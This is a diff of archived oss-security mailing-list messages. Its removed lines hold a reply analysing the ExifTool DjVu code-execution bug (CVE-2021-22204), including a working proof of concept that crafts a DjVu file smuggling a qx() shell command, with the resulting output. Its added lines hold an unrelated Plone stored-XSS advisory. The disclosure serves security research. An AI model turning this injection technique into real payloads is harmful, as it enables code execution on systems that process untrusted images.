@@ -1,43 +1,34 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/05/10/5
-Message-ID: <20210510134618.dcarjcit5ftpomdm@jwilk.net>
-Date: Mon, 10 May 2021 15:46:18 +0200
-From: Jakub Wilk <jwilk@...lk.net>
-To: <oss-security@...ts.openwall.com>
-Subject: Re: [CVE-2021-22204] ExifTool - Arbitrary code execution in the DjVu module when parsing a malicious image
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/06/30/2
+Message-ID: <5102a4b5-ade4-643b-66f3-41c0f7e4bbcc@vanrees.org>
+Date: Wed, 30 Jun 2021 20:25:34 +0200
+From: Maurits van Rees <maurits@...rees.org>
+To: oss-security@...ts.openwall.com
+Subject: Plone: stored XSS in folder contents
 Content-Type: text/plain; charset=utf-8
 
-* William Bowling <will@...wling.info>, 2021-05-09, 14:32:
->ExifTool 7.44 to 12.23 has a bug in the DjVu module which allows for 
->arbitrary code execution when parsing malicious images.
+A very good day to all you lovely people!
 
-Using eval() to parse C-like strings is undoubtedly a terrible idea, but 
-the code does attempt to neutralize the input, and it wasn't immediately 
-obvious to me where the bug is. It turns out the way it determines where 
-the string ends is incorrect:
+Matt Moreschi discovered a vulnerability in Plone and reported it to the 
+security list, security@...ne.org.
+In Plone 5.0.0 through 5.2.4, Editors are vulnerable to XSS in the 
+folder contents view, if a Contributor has created a folder with a 
+SCRIPT tag in the description field.
+Full information is here: 
+https://plone.org/security/hotfix/20210518/stored-xss-in-folder-contents
+Since we had recently created a hotfix package, we decided to include a 
+fix in a new version, 1.5.
+This is available from 
+https://pypi.org/project/Products.PloneHotfix20210518/1.5/ and 
+https://plone.org/security/hotfix/20210518
+The fix will be included in the affected package plone.app.content 
+3.8.8, which will be included in Plone 5.2.5, expected in July.
 
-    # we're good unless quote was escaped by odd number of backslashes
-    last unless $tok =~ /(\\+)$/ and length($1) & 0x01;
+CVE number is CVE-2021-35959:
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35959
 
-But $ doesn't match only the end of the string; it matches also before 
-the trailing newline. You need \z if you want only the former. (But of 
-course in this case ditching eval(), rather than fine-tuning the regex, 
-was the right course of action.)
-
-Proof of concept:
-
-   $ printf 'P1 1 1 0' > moo.pbm
-   $ cjb2 moo.pbm moo.djvu
-   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned>&2);#"' >> moo.djvu
-   $ exiftool moo.djvu > /dev/null
-    _______
-   < pwned >
-    -------
-           \   ^__^
-            \  (oo)\_______
-               (__)\       )\/\
-                   ||----w |
-                   ||     ||
+Thanks,
 
 -- 
-Jakub Wilk
+Maurits van Rees https://maurits.vanrees.org/
+
